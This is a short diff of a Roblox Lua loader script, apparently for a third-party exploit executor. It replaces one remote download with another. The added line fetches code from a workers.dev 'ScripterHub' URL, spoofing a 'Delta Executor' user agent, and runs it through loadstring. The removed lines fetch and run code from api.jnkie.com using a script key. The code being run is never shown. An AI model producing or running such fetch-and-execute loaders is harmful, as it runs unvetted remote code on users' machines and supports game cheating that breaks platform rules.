@@ -1,3 +1,1 @@
-getgenv().SCRIPT_KEY = "3be45317-ab7d-4254-ae01-de86eee372e7"
-
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/ed8aae937f543469e368707eabd36dfd87b560756865f3ecb9d0b458b739c0eb/download"))()
+loadstring((request and request({Url="https://scripterhub-stats.dubovikstanislav51.workers.dev/sh/ScripterHub2773819926",Method="GET",Headers={["User-Agent"]="Roblox/570 Delta Executor"}}).Body) or game:HttpGet("https://scripterhub-stats.dubovikstanislav51.workers.dev/sh/ScripterHub2773819926"))()
